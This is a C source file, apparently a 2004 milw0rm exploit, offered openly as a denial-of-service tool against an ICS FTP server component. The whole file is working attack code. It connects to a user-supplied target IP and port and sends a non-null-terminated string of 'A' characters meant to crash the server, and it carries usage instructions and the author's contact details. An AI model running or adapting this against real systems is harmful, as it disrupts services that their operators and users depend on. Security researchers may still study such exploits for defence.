//--Exploit:
//===========================================================
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, \\\"ws2_32.lib\\\")


char Non_null_terminated_string [] = \\\"AAAAAAAAAAAAAAAAAA\\\";

int main(int argc, char *argv[])
{
WSADATA wsaData;
WORD wVersionRequested;
struct hostent *pTarget;
struct sockaddr_in sock;
char *target;
int port,bufsize;
SOCKET mysocket;
int res=1;
char text[1024]={\\\' \\\'};

if (argc < 2)
{
printf(\\\"\\\\r\\\\nICS FTP server Component Denial Of Service
vulnerability\\\\r\\\\n\\\", argv[0]);
printf(\\\"Coded By ATmaCA\\\\r\\\\n\\\");
printf(\\\"E-Mail:atmaca@prohack.net\\\\r\\\\n\\\");
printf(\\\"Web:www.prohack.net\\\\r\\\\n\\\\r\\\\n\\\");
printf(\\\"Usage:\\\\r\\\\n %s <targetip> [targetport] (default is
21)\\\\r\\\\n\\\\r\\\\n\\\",argv[0]);

exit(1);
}

wVersionRequested = MAKEWORD(1, 1);
if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;

target = argv[1];
port = 21;

if (argc >= 3) port = atoi(argv[2]);
bufsize = 1024;
if (argc >= 4) bufsize = atoi(argv[3]);

mysocket = socket(AF_INET, SOCK_STREAM, 0);
if(mysocket==INVALID_SOCKET)
{
printf(\\\"Socket error!\\\\r\\\\n\\\");
exit(1);
}

printf(\\\"Resolving Hostnames...\\\\n\\\");
if ((pTarget = gethostbyname(target)) == NULL)
{
printf(\\\"Resolve of %s failed\\\\n\\\", argv[1]);
exit(1);
}

memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
sock.sin_family = AF_INET;
sock.sin_port = htons((USHORT)port);

printf(\\\"Connecting...\\\\n\\\");
if ( (connect(mysocket, (struct sockaddr *)&sock, sizeof (sock) )))
{
printf(\\\"Couldn\\\'t connect to host.\\\\n\\\");
exit(1);
}

printf(\\\"Connected!...\\\\n\\\");
printf(\\\"Sending Non-null-terminated-string...\\\\n\\\");
if (send(mysocket,Non_null_terminated_string,
sizeof(Non_null_terminated_string)-1, 0) == -1)
{
printf(\\\"Error Sending the Non-null-terminated-string.\\\\r\\\\n\\\");
closesocket(mysocket);
exit(1);
}

closesocket(mysocket);
WSACleanup();
return 0;
}

// milw0rm.com [2004-07-20]
